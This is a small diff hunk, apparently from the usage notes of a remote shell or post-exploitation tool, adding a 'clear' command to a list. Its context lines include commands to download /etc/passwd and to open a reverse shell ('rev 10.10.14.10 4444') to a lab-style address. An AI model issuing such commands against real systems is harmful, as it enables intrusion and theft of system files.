@@ -74,6 +74,7 @@ enum
 download /etc/passwd
 upload local.txt /tmp/local.txt
 rev 10.10.14.10 4444
+clear
 exit
 ```
 
